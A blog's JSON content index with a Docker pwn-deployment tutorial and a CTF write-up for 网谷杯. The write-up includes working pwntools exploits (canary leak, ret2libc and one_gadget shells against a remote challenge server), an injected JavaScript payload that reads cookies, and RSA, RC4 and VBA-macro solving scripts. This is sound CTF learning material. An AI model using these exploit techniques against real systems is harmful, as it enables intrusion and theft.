{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2025-08-28T05:46:22.000Z","updated":"2025-08-28T05:46:22.452Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2025-08-28T05:44:36.000Z","updated":"2025-08-28T05:44:36.850Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"pwn_docker题目部署","slug":"pwn-docker题目部署","date":"2025-09-23T06:32:22.000Z","updated":"2025-09-23T08:35:51.612Z","comments":true,"path":"2025/09/23/pwn-docker题目部署/","permalink":"http://example.com/2025/09/23/pwn-docker%E9%A2%98%E7%9B%AE%E9%83%A8%E7%BD%B2/","excerpt":"","text":"dockerDocker 是一个 容器化工具。 在不同的环境下，程序可能因为处于不同的环境无法正常运行， docker能把 程序 + 依赖环境 一起打包成一个标准的“盒子”（镜像），然后在任何地方都能运行（容器），容器就是镜像的动态实例. 组成部分docker主要有四部分： 镜像 (Image) 相当于一个“安装包”或者“模版”。里面写明了操作系统、依赖库、程序文件。 容器 (Container) 镜像运行后的实例，就像“安装包”安装出来并运行的程序。容器是活的，可以改动、运行、停止、删除。 Dockerfile 就是一份“说明书”，写清楚镜像怎么制作。 仓库 (Registry) 存放镜像的地方，比如： Docker Hub（公共仓库） 阿里云容器镜像服务 基础操作1.查看本地镜像 1docker images 2.构造镜像 生成一个镜像 (Image)，存在于本地的 Docker 镜像库里。 1docker build -t &lt;镜像名[:tag]&gt; （构建上下文目录） 3.上传镜像 1docker push &lt;IMAGE&gt;（[&lt;仓库名&gt;/]&lt;命名空间&gt;/&lt;REPO&gt;:&lt;TAG&gt;） 4.查看本地镜像 1docker images 5.删除镜像 1docker rmi -&lt;版本号&gt; pwn部署首先要创建自己的阿里云 这些操作好之后在虚拟机中执行以登录自己的阿里云账号（一般登陆一次之后会一直保持登录状态） 配置代理1.开启小猫的Allow LAN (允许局域网连接) 默认情况下，Clash 只监听 本机回环地址（127.0.0.1:7890），只有 Windows 自己能用代理。勾选了 Allow LAN，Clash 会监听 0.0.0.0:7890，也就是允许 局域网内其他设备（虚拟机、Docker 容器、手机等）通过你的电脑的 IP 地址来使用代理 2.然后去查看Windows 宿主机上的虚拟网卡 1ipconfig.exe 3.文本编辑器打开，写入 1sudo vim /usr/bin/dockerproxy 4.改宿主机ip和端口输入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/bin/bash# Docker 代理管理脚本# 使用方法: sudo ./docker-proxy.sh [set|unset] [proxy_address]set -e# 默认代理地址DEFAULT_PROXY=&quot;网卡:7890&quot;PROXY_DIR=&quot;/etc/systemd/system/docker.service.d&quot;PROXY_CONF=&quot;$PROXY_DIR/http-proxy.conf&quot;# 显示使用说明usage() &#123; echo &quot;使用方法: $0 [set|unset] [proxy_address]&quot; echo &quot; set [proxy_address] - 设置 Docker 代理 (默认: $DEFAULT_PROXY)&quot; echo &quot; unset - 取消 Docker 代理配置&quot; exit 1&#125;# 检查是否以 root 权限运行check_root() &#123; if [ &quot;$EUID&quot; -ne 0 ]; then echo &quot;请使用 sudo 或以 root 权限运行此脚本&quot; exit 1 fi&#125;# 设置 Docker 代理set_proxy() &#123; local proxy_addr=$&#123;1:-$DEFAULT_PROXY&#125; echo &quot;正在设置 Docker 代理: $proxy_addr&quot; # 创建配置目录 mkdir -p &quot;$PROXY_DIR&quot; # 创建代理配置文件 cat &gt; &quot;$PROXY_CONF&quot; &lt;&lt; EOF[Service]Environment=&quot;HTTP_PROXY=http://$proxy_addr&quot;Environment=&quot;HTTPS_PROXY=http://$proxy_addr&quot;Environment=&quot;NO_PROXY=localhost,127.0.0.1,.docker.internal,.hubproxy.docker.internal&quot;EOF # 重新加载配置并重启 Docker systemctl daemon-reload systemctl restart docker echo &quot;Docker 代理设置完成&quot; echo &quot;当前代理配置:&quot; systemctl show --property=Environment docker&#125;# 取消 Docker 代理配置unset_proxy() &#123; echo &quot;正在取消 Docker 代理配置&quot; # 删除代理配置文件 if [ -f &quot;$PROXY_CONF&quot; ]; then rm -f &quot;$PROXY_CONF&quot; echo &quot;已删除代理配置文件: $PROXY_CONF&quot; else echo &quot;未找到代理配置文件: $PROXY_CONF&quot; fi # 重新加载配置并重启 Docker systemctl daemon-reload systemctl restart docker echo &quot;Docker 代理配置已取消&quot; echo &quot;当前环境变量:&quot; systemctl show --property=Environment docker&#125;# 主程序main() &#123; check_root case &quot;$1&quot; in set) set_proxy &quot;$2&quot; ;; unset) unset_proxy ;; *) usage ;; esac&#125;# 执行主程序main &quot;$@&quot; 然后赋执行权限 1sudo chmod +x /usr/bin/dockerproxy 网卡（模糊化处理）→ 宿主机的 IP（在虚拟网络环境下 VM&#x2F;容器可达的地址） 7890 → 代理软件提供的服务端口（通常是 HTTP&#x2F;HTTPS 代理，常见于 Clash） 作用：让 Docker 的网络请求走代理，加速&#x2F;绕过网络限制。 1DEFAULT_PROXY=&quot;网卡:7890&quot; 在宿主机（Windows）上跑 Clash，开了一个代理： 但是在 Kali 虚拟机里跑 Docker，要让 Docker 用这个代理： 在 VM 里写 127.0.0.1:7890 是不对的，因为那是 VM 自己。 要写宿主机在 VM 眼中的地址，比如 网卡:7890。这样 Docker 请求才会正确发到宿主机的代理。 使用 12sudo dockerproxy set#使用代理sudo dockerproxy unset#取消代理 也可以自定义代理 1sudo dockerproxy set 172.27.16.1:7890 验证是否走代理 1docker info | grep -i proxy HTTP Proxy &#x2F; HTTPS Proxy → Docker Daemon 的全局网络请求会走 Windows 宿主机上的 Clash 代理 No Proxy → 这些地址不走代理（本机回环和 Docker 内部域名） （warning是宿主机内核缺少 blkio（块设备限速）的支持，跟代理没关系，可以忽略） 镜像操作1.先要拉取镜像 1234docker pull ubuntu:22.04docker pull ubuntu:20.04docker pull ubuntu:18.04docker pull ubuntu:16.04 很多时候，Dockerfile 里开头写的是： 1FROM ubuntu:22.04 那么在 docker build 时，如果本地没有 ubuntu:22.04，Docker 就会自动去拉。 这个操作其实就是提前把它保存在本地，因为它也需要配置代理，刚好测试你的 代理配置是否生效。 2.从Github上下载打包好的项目 链接(也需要链接代理) 然后把对应版本的附件重命名之后替换src中的文件就好了 3.最后就是build镜像 push上去 之后在镜像库里就可以找到这个镜像了 最后把这个镜像的完整引用放入网站就可以了","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"第三届陇剑杯决赛","slug":"第三届陇剑杯决赛","date":"2025-09-22T08:17:13.000Z","updated":"2025-09-22T08:17:13.796Z","comments":true,"path":"2025/09/22/第三届陇剑杯决赛/","permalink":"http://example.com/2025/09/22/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%87%E5%89%91%E6%9D%AF%E5%86%B3%E8%B5%9B/","excerpt":"","text":"","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"网谷杯","slug":"网谷杯","date":"2025-09-14T06:16:09.000Z","updated":"2025-09-14T06:21:21.960Z","comments":true,"path":"2025/09/14/网谷杯/","permalink":"http://example.com/2025/09/14/%E7%BD%91%E8%B0%B7%E6%9D%AF/","excerpt":"","text":"pwn金丝雀-wgb附件 分析看到main中的buf可以绕过canary，而gift是很明显的栈溢出 用read函数去泄露，把canary的值放到bss段，写出来 之后用retlibc去泄露就好，（把canary放在合适的位置上面） 可以看到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *#p= process(&quot;./111&quot;)p=remote(&quot;119.36.240.225&quot;,48793)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&quot;./111&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)pop_rdi = 0x4013e3ret = 0x40101agift = 0x40123Dbss = 0x404f00puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]lea=0x401296payload = p64(bss) + p64(lea)p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;2&#x27;)p.send(payload)lea=0x4012EApayload = p64(bss - 0x8 + 0x50) + p64(lea)p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;2&#x27;)p.send(payload)p.recvline().strip()canary = u64(p.recv(8) , 16)print(&quot;=====&quot; , canary)p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;1&#x27;)payload = b&#x27;a&#x27; * 0x38 + p64(canary) + p64(0)payload+=p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(gift)p.send(payload)libc_base = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)) - 0x84420 system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload = b&#x27;a&#x27; * 0x38 + p64(canary) + p64(0)payload+= p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)p.send(payload)p.interactive() flag{9fa258d4-dfef-414d-80f9-9e315889462f} 注意，这里要抬栈，不然函数会在scanf卡住[0x403b08] 这里卡在了mov操作，要写入的w权限 zeroday-wgb附件 分析，6可以输出地址，用它来泄露libc基地址，7可以直接运行+144的位置，但是buf最多输入0x400,所以要对buf_0输入，也就是用1进行，在+144位置上放上后门函数就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *import sysp = remote(&quot;119.36.240.225&quot;, 43376)libc = ELF(&quot;libc.so.6&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&quot;./pwn&quot;)def sa(a, b): p.sendafter(a, b)def push_q(x): return b&#x27;\\x01&#x27; + p64(x)def op_pop(): return b&#x27;\\x02&#x27;def op_add(): return b&#x27;\\x03&#x27;def op_xor(): return b&#x27;\\x04&#x27;def op_print():return b&#x27;\\x05&#x27;def op_call(): return b&#x27;\\x06&#x27;def leak(addr):return b&#x27;\\x07&#x27; + p64(addr)puts_got = elf.got[&quot;puts&quot;]payload_leak = leak(puts_got)sa(b&quot;Enter bytecode:&quot;, payload_leak)p.recvuntil(b&quot;LEAK: &quot;)leak_line = p.recvline()parts = leak_line.split(b&#x27; &#x27;)puts_real_addr_str = parts[2]puts_real_addr = int(puts_real_addr_str, 16)log.info(f&quot;Puts real address: &#123;hex(puts_real_addr)&#125;&quot;)libc_base = puts_real_addr - libc.symbols[&quot;puts&quot;]log.info(f&quot;Libc base address: &#123;hex(libc_base)&#125;&quot;)off = 0xe3afetarget = libc_base + offpayload = b&#x27;&#x27;payload += push_q(0) * 16payload += push_q(target)payload += op_call()p.send(payload)sa(b&quot;Enter bytecode:&quot;, b&quot;ls -al&quot;)p.interactive() flag{840fde71-2c8a-4d4f-a716-1232fdf72054} web真假之间-wgb payload:a&#x3D;7e6&amp;b&#x3D;axht&amp;c&#x3D;function%20setItem%28k%2Cv%29%7BsessionStorage.setItem%28k%2CJSON.stringify%28v%29%29%3B%7D%20setItem%28%272025x%27%2C%20%5B%22a%22%2C%209999999999999999%5D%29%3B 执行 12345678// 输出当前页面的 Cookieconsole.log(&#x27;cookie=&#x27;, document.cookie);// 输出 sessionStorage 中键为 &#x27;2025x&#x27; 的值console.log(&#x27;sessionStorage[2025x]=&#x27;, sessionStorage.getItem(&#x27;2025x&#x27;));// 输出 ID 为 &#x27;flag_base85&#x27; 的元素的文本内容，如果不存在则输出 &#x27;&lt;empty&gt;&#x27;console.log(&#x27;#flag_base85=&#x27;, document.getElementById(&#x27;flag_base85&#x27;) ? document.getElementById(&#x27;flag_base85&#x27;).textContent : &#x27;&lt;empty&gt;&#x27;); flag{D9xT7ePqA1LuVnYk} MISCFormat-8bit-wgb随波逐流提取 转一下 flag{2815dc1e28f9d89e2b80072d23c4dc35} non-interlaced-wgb 脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import numpy as npimport binascii # 导入 binascii 库，用于处理二进制和 ASCII 之间的转换（尽管在此脚本中未直接使用）import ioimport zipfile # 导入 zipfile 库，用于处理 ZIP 压缩文件import os # 导入 os 库，用于与操作系统交互（例如文件路径）from PIL import Image # 导入 Pillow 库的 Image 模块，用于处理图像# 定义一个函数，用于将图像的 RGB 通道数据按顺序提取为字节串def img_to_bytes_rgb_order(path): # 使用 Pillow 库打开图像文件，并将其转换为 RGB 模式 arr = np.array(Image.open(path).convert(&quot;RGB&quot;)) # 将图像的 RGB 平面按顺序拼接：首先是所有 R 通道数据，然后是所有 G 通道数据，最后是所有 B 通道数据 # .flatten() 将二维数组展平为一维 # .tolist() 将 NumPy 数组转换为 Python 列表 # bytes(...) 将列表转换为字节串 return bytes(arr[:,:,0].flatten().tolist() + arr[:,:,1].flatten().tolist() + arr[:,:,2].flatten().tolist())# 通过列表推导式，依次处理三张图像，并将它们的字节串连接起来# 假设这三张图像的文件路径是 &quot;/mnt/data/c1.png&quot;, &quot;/mnt/data/c2.png&quot;, &quot;/mnt/data/c3.png&quot;# 最终将所有图像的字节数据拼接成一个完整的字节串data = b&#x27;&#x27;.join(img_to_bytes_rgb_order(p) for p in [&quot;/mnt/data/c1.png&quot;,&quot;/mnt/data/c2.png&quot;,&quot;/mnt/data/c3.png&quot;])# 指定恢复后的 ZIP 文件的路径zip_path = &quot;/mnt/data/recovered_from_9_images.zip&quot;# 以二进制写入模式打开文件，将拼接好的字节数据写入其中with open(zip_path, &quot;wb&quot;) as f: f.write(data)# 尝试读取新创建的 ZIP 文件，并列出其内部的文件名listing = []try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zf: # zf.namelist() 获取 ZIP 文件中所有文件和文件夹的名称列表 listing = zf.namelist()except Exception as e: # 如果在读取 ZIP 文件时发生任何错误（例如文件损坏），则捕获异常并记录错误信息 listing = [f&quot;读取ZIP时出现问题: &#123;e!r&#125;&quot;]# 打印最终的文件列表或错误信息，以便用户查看结果print(listing) flag{1c2121cab407dd44a5540d530ab9c6aa} CRY证书修复-wgb三个与 RSA，flag1直接解 flag23是dp泄露，泄露参数 dp、公钥指数 e 和模数 n，计算出模数 n 的一个素因数 p去重构私钥 d，从而解密密文 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185#!/usr/bin/env python3# -*- coding: utf-8 -*-from Crypto.Util.number import bytes_to_long, long_to_bytes # 导入用于处理大整数和字节串的库import math # 导入数学库，用于最大公约数计算# 这段脚本旨在解决三个基于 RSA 的密码学挑战（CTF 题目）# --- Flag1: 题面已给 d1, n1，直接解密 ---# d1 是第一个挑战的私钥指数d1 = int( &quot;246014400079542834092587904158893656266047385977563055118072356568676746697095&quot; &quot;825913864806962708152448954200878667383422993297898494259484707349502246104506&quot; &quot;292708966897357241647506535040670750128510698600522884133934921403976388746897&quot; &quot;47304249627737638521072321625292497180208183282090634794285367566044496049&quot;)# n1 是第一个挑战的模数n1 = int( &quot;121216793759965406495195349784688471172903898464863919579528667261419201175006&quot; &quot;158506254851920269184174476441342645096664857617956346276850231302641370595849&quot; &quot;992364168925183323567715165305825214477546120105756089950903529561478112787635&quot; &quot;175307546002017263761103481685637785188859785795387227441771118141108993731&quot;)# --- Flag2: dp 泄露攻击 ---# n2 是第二个挑战的模数n2 = int( &quot;880240914857229681312031297728305248816545296251441345888143405900115541246043&quot; &quot;164032587947185950587601925814651819329544052882761982559510378904410578348151&quot; &quot;153512391510277303040801105941161928077798175274696915482616445385505290118824&quot; &quot;99685981945213841298369305720161373509056672240371216670722254664850792423&quot;)# dp2_hex 是私钥指数 d 模 p-1 的结果，以十六进制给出dp2_hex = ( &quot;008a1bb5ddfff1643cb542d174a0f4e0616503e28778bd2ecd965026baba357303627d6044b77&quot; &quot;34cef07b8a1176d886ca987cd21ca091755eef7f20634a921ce81&quot;)e2 = 65537 # 公钥指数# --- Flag3: dp 泄露攻击 ---# n3 是第三个挑战的模数n3 = int( &quot;161097000312435047639025857083798608426453770394810689419872061300529854423940&quot; &quot;452844900091705515387130272189159935215821125906831946941166430461267964034092&quot; &quot;194438035823677086083564924149614045494613496178826123777949284989729443312266&quot; &quot;399276493423985154752448654420778684877265358368899693320567387749119123981&quot;)# dp3_hex 是私钥指数 d 模 p-1 的结果，以十六进制给出dp3_hex = ( &quot;0087462d8061c0f6251ca4e9b9dd7d5926d96081d5b52f7b76581365865278f0a13f7051d2ece1&quot; &quot;dda234c41946211a4839f72b2b5fb82bbfa286d82e868ce87341&quot;)e3 = 65537 # 公钥指数def read_cipher(path: str) -&gt; int: &quot;&quot;&quot;从文件中读取密文，并将其转换为大整数。&quot;&quot;&quot; with open(path, &quot;rb&quot;) as f: return bytes_to_long(f.read())def rsa_decrypt_with_d(n: int, d: int, c: int) -&gt; bytes: &quot;&quot;&quot;使用完整的私钥指数 d 对密文进行解密。 参数: n (int): RSA 模数。 d (int): 私钥指数。 c (int): 密文大整数。 返回: bytes: 解密后的明文字节串。 &quot;&quot;&quot; m = pow(c, d, n) # RSA 解密的核心操作: m = c^d mod n pt = long_to_bytes(m) # 将大整数明文转换回字节串 return ptdef recover_p_from_dp(n: int, e: int, dp: int) -&gt; int | None: &quot;&quot;&quot; 根据 d_p（dp）和 n、e，利用 Fermat 小定理或 k 枚举来恢复素数 p。 原理是 dp = d mod (p-1) = e^-1 mod (p-1)。 这推导出 e*dp ≡ 1 (mod p-1)，所以 e*dp - 1 是 p-1 的倍数。 即 e*dp - 1 = k*(p-1)，可以重新排列得到 p = (e*dp-1)/k + 1。 为了找到 k，我们利用一个已知的引理： (e*dp - 1) = k*(p-1) 且 a^(e*dp-1) ≡ a^k(p-1) ≡ a (mod p) 所以 gcd(a^(e*dp-1) - a, n) 会得到 p 或 q 的因子。 参数: n (int): RSA 模数。 e (int): 公钥指数。 dp (int): 泄露的私钥指数 dp。 返回: int | None: 如果成功找到 p，返回 p；否则返回 None。 &quot;&quot;&quot; # 优先使用更稳妥的 GCD 方法来分解 n edp = e * dp - 1 for a in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31): g = math.gcd(pow(a, edp, n) - 1, n) if 1 &lt; g &lt; n: return g # 如果 GCD 方法失败，回退到 k 枚举法 num = edp # edp - 1 for k in range(1, e): if num % k == 0: p = num // k + 1 if p &gt; 1 and n % p == 0: return p return Nonedef rsa_decrypt_with_dp(n: int, e: int, dp_hex: str, c: int) -&gt; bytes: &quot;&quot;&quot; 使用泄露的 dp 来解密 RSA 密文。 该函数首先利用 dp 恢复出 p，然后计算 q、phi、d，最后完成解密。 参数: n (int): 模数。 e (int): 公钥指数。 dp_hex (str): 泄露的 dp，十六进制格式。 c (int): 密文。 返回: bytes: 解密后的明文。 &quot;&quot;&quot; # 将十六进制字符串 dp_hex 转换为大整数 dp dp = int(dp_hex, 16) # 恢复素数 p p = recover_p_from_dp(n, e, dp) if not p: raise ValueError(&quot;未能从 dp 恢复出 p。&quot;) # 根据 p 和 n 计算 q，并计算 phi(n) q = n // p phi = (p - 1) * (q - 1) # 计算完整的私钥指数 d = e^-1 mod phi d = pow(e, -1, phi) # 使用 d 对密文进行解密 m = pow(c, d, n) # 将解密结果转换回字节串 return long_to_bytes(m)def try_print(tag: str, data: bytes): &quot;&quot;&quot; 尝试以 UTF-8 编码打印数据，如果失败则以十六进制形式打印。 参数: tag (str): 打印时使用的前缀标签。 data (bytes): 待打印的字节串数据。 &quot;&quot;&quot; try: # 尝试解码为 UTF-8，忽略无法解码的字符 print(f&quot;&#123;tag&#125;: &#123;data.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;, end=&quot;&quot;) except Exception: # 如果解码失败，打印十六进制表示 print(f&quot;&#123;tag&#125; (hex): &#123;data.hex()&#125;&quot;)def main(): &quot;&quot;&quot;主函数，依次执行三个挑战的解密任务。&quot;&quot;&quot; # Flag1: 直接使用给定的 n1, d1 解密 c1 = read_cipher(&quot;flag1.txt&quot;) pt1 = rsa_decrypt_with_d(n1, d1, c1) try_print(&quot;Flag1&quot;, pt1) # Flag2: 使用泄露的 dp2 解密 c2 = read_cipher(&quot;flag2.txt&quot;) pt2 = rsa_decrypt_with_dp(n2, e2, dp2_hex, c2) try_print(&quot;\\nFlag2&quot;, pt2) # Flag3: 使用泄露的 dp3 解密 c3 = read_cipher(&quot;flag3.txt&quot;) pt3 = rsa_decrypt_with_dp(n3, e3, dp3_hex, c3) try_print(&quot;\\nFlag3&quot;, pt3) print() # 换行if __name__ == &quot;__main__&quot;: main() flag{You_do_have_a_good_understanding_of_certificate_formats_and_the_RSA_algorithm.} 三重秘影-wgb一共有三个加密 这里还有一个图片，把它也提取出来 解密得到9273016854 最后还有一个base64 最后SM4解密 flag{a8d2f9b1c3e7g6h4i5j} reversere1-NewRC4-wgb先查壳，看到UPX，这个是魔改了 用010打开，把VMP都改成UPX就好了 用upx 命令脱壳，然后放到IDA里面进行逆向分析 这个密文是错的，它使用了TLS回调，会修改key的值，如果动态调试也会被检测出来，key还会被修改 那么真正的key就是 那一串nbGvzyHebFGcV8auYoqe 与 0x7a异或 这个很明显是rc4魔改了 都在后面加上了113 直接写出脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import structdef solve(): key = [0x14,0x18,0x3d,0x0c,0x00,0x03,0x32,0x1f,0x18,0x3c,0x3d,0x19,0x2c,0x42,0x1b,0x0f,0x23,0x15,0x0b,0x1f] key_len = len(key) # 模拟RC4的KSA (密钥调度算法) S = list(range(256)) T = [key[i % key_len] for i in range(256)] j = 0 for i in range(256): j = (j + S[i] + T[i]) % 256 S[i], S[j] = S[j], S[i] S_ksa_final = S[:] buf1_dwords = [ -1099083345, 2129584582, 1339278712, -1197737055, 632459247, -1426643507, -314991759, -1937737471, -1369194212, -269001761 ] buf1_word = 10008 ciphertext = b&#x27;&#x27; for d in buf1_dwords: ciphertext += struct.pack(&#x27;&lt;i&#x27;, d) ciphertext += struct.pack(&#x27;&lt;h&#x27;, buf1_word) ciphertext = ciphertext[:42] #模拟变种RC4的PRGA并解密 plaintext = bytearray() i = 0 j = 0 for char_idx in range(len(ciphertext)): i = (i + 1) % 256 j = (j + S_ksa_final[i]) % 256 s_i_before_swap = S_ksa_final[i] S_ksa_final[i], S_ksa_final[j] = S_ksa_final[j], S_ksa_final[i] s_i_after_swap = S_ksa_final[i] t = (s_i_before_swap + s_i_after_swap) % 256 keystream_byte = S_ksa_final[t] # 解密公式 dec_byte = ((ciphertext[char_idx] - 113) &amp; 0xFF) ^ keystream_byte plaintext.append(dec_byte) return plaintext.decode()if __name__ == &#x27;__main__&#x27;: try: flag = solve() print(f&quot;The flag is: &#123;flag&#125;&quot;) except Exception as e: print(f&quot; An error occurred: &#123;e&#125;&quot;) 算法组合-wgb使用IDA进行逆向分析 这个是有多个算法来限制flag的，flag的长度是20，并且要求flag{}包裹 直接喂给ai 1.把输入按6段切开并依次参与后续校验： [0..4]”f1ag{“|[5..8]4字节|[9..12]4字节|[13]1字节|[14..18]5字节|[19] 2.AES-like”块校验 用byte_BB400 AES S-box和dword_F6380(FIPS-197经典示例密钥2B 7E 15 16 …的派生表）对前16字节做5轮样式的变换，结果要匹配常量xmmword_BB500。 结合后续约束，这一块把前16字节唯一卡成了： b”flag[r3v3rs3_1s_”(（也就是内容第0.15位）。 单字符凯撒+3，要求变换后的字符串等于“4”，且原字符得是数字→下标13必为1”。 5字节自定义64表映射+明文直比。结果必须是“”zfm1u”； 接着程序又直接把原字节和”s_fun”做逐字比较→下标14.18为”s_fun”。 4字节异或常量 另一段4字节（对应分段向量的第5&#x2F;6项，落在下标9.12）每字节0x42后要等于常量 493957424的“小端”字节串，即b’01q\\x1d’。 6.统计约束 末尾还有一条：数字个数&gt;1且元音（aeiou）总数&gt;1。 r3v3rs3_1s_fun里有数字3”和”1’两个；元音a’，’u两个，满足。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788def rotp3(ch: str) -&gt; str: &quot;&quot;&quot;凯撒 +3 加密&quot;&quot;&quot; o = ord(ch) if 97 &lt;= o &lt;= 122: # a-z return chr((o - 97 + 3) % 26 + 97) if 65 &lt;= o &lt;= 90: # A-Z return chr((o - 65 + 3) % 26 + 65) if 48 &lt;= o &lt;= 57: # 0-9 return chr((o - 48 + 3) % 10 + 48) return chdef inv_rotp3_to_make_4() -&gt; str: &quot;&quot;&quot;第13位字符：逆运算得到 rotp3(seg3) == &#x27;4&#x27; 的原字符&quot;&quot;&quot; o = ord(&#x27;4&#x27;) - 48 return chr((o - 3) % 10 + 48) # 结果为 &#x27;1&#x27;def recover_seg2_from_xor() -&gt; str: &quot;&quot;&quot;下标9..12的4字节：每字节 ^0x42 后得到 b&#x27;01q\\x1d&#x27;，反推原字节&quot;&quot;&quot; target = 493_957_424 # 0x1D713130 le = target.to_bytes(4, &#x27;little&#x27;) # b&#x27;\\x30\\x31\\x71\\x1d&#x27; raw = bytes([b ^ 0x42 for b in le]) return raw.decode(&#x27;latin1&#x27;) # 返回 &#x27;rs3_&#x27;def check(s: str) -&gt; bool: &quot;&quot;&quot;校验 flag 是否满足约束&quot;&quot;&quot; if len(s) != 20 or not s.startswith(&quot;flag&#123;&quot;) or s[-1] != &quot;&#125;&quot;: return False seg1 = s[5:9] seg2 = s[9:13] seg3 = s[13:14] seg4 = s[14:19] # 前16字节约束 if s[:16] != &quot;flag&#123;r3v3rs3_1s_&quot;: return False # 单字符 rotp3 后应为 &#x27;4&#x27; if not seg3.isdigit() or rotp3(seg3) != &quot;4&quot;: return False # 段4必须为 &#x27;s_fun&#x27; if seg4 != &quot;s_fun&quot;: return False # 段2每字节 ^0x42 == b&#x27;01q\\x1d&#x27; want = bytes([0x30, 0x31, 0x71, 0x1d]) got = bytes([ord(c) ^ 0x42 for c in seg2]) if got != want: return False # 数字&gt;1 且元音&gt;1 digits = sum(ch.isdigit() for ch in s) vowels = sum(ch in &quot;aeiou&quot; for ch in s) if not (digits &gt; 1 and vowels &gt; 1): return False return Truedef main(): head, tail = &quot;flag&#123;&quot;, &quot;&#125;&quot; seg1 = &quot;r3v3&quot; seg2 = recover_seg2_from_xor() # &#x27;rs3_&#x27; seg3 = inv_rotp3_to_make_4() # &#x27;1&#x27; seg4 = &quot;s_fun&quot; flag = f&quot;&#123;head&#125;&#123;seg1&#125;&#123;seg2&#125;&#123;seg3&#125;&#123;seg4&#125;&#123;tail&#125;&quot; # 自检 assert len(flag) == 20 assert flag.startswith(&quot;flag&#123;&quot;) and flag.endswith(&quot;&#125;&quot;) assert seg2 == &quot;rs3_&quot; assert seg3 == &quot;1&quot; assert seg4 == &quot;s_fun&quot; assert sum(ch.isdigit() for ch in flag) &gt; 1 assert sum(ch in &quot;aeiou&quot; for ch in flag) &gt; 1 print(&quot;flag:&quot;, flag) print(&quot;check:&quot;, &quot;ok&quot; if check(flag) else &quot;FAIL&quot;)if __name__ == &quot;__main__&quot;: main() flag{r3v3rs3_1s_fun} 满江红-wgb考的是VBA宏 使用命令olevba E:\\re\\网谷杯\\满江红.doc 这是多个base64加密，解密逻辑是使用了一个大的 Base64 编码的密钥 key，结合数组 ciphertext 进行 XOR 解密，然后拼接成字符串。 import base64​# Base64 解码 keydef base64decode(s): return base64.b64decode(s)​# unxor 函数def unxor(ciphertext, start, key): cleartext &#x3D; “” for i in range(len(ciphertext)): cleartext +&#x3D; chr(key[i + start] ^ ciphertext[i]) return cleartext​# Base64 key（VBA 中的拼接内容）key_b64 &#x3D; ( “rFd10H3vao2RCodxQF2lbfkUAjIr&#x2F;6DL5qCnyC4p5EA0tEOXFafhhIdAIhum0XulB9+lU9wKRrDSWZ7XHGxFnPVUhqNK2DCnW8bI1MVWYxGhC4q5iFT5EzfCdTcWUu2+X9VTnKuwcOaIxVcmVyVjrWIRz4Dm3kecLNgAU8fZOKcu&#x2F;XuMXN85ZMKjd3Rv882RBUFmICvacdJ36Yojk5HAwYoBpjjjHydt4NwJisnXgtA3K+2xqGEBfAPmz73uyn7CxCKGt7xPUdc+oRoeY+oObiyzIEPQS3mhWffHsNBhkbrBz1os3xEgxuM3gN6Xa5SE7Zo6G7vMFeKdYops3DGQuyDY60v7KXscOCLxwqeRFC+buIRH69E90JdP7KSC4CDZhxlv&#x2F;cnX6HWdcWh7UTM7CWqzymtkqm&#x2F;3fjp76pGxscG40k&#x2F;M6UjaMnWg++oCkJZFMMenTvaxZ7GwyedlMxbOAtZ+INlBK+tPPIFbG42SRtmJH1e8Uz5p1E7h61vdxBkl” 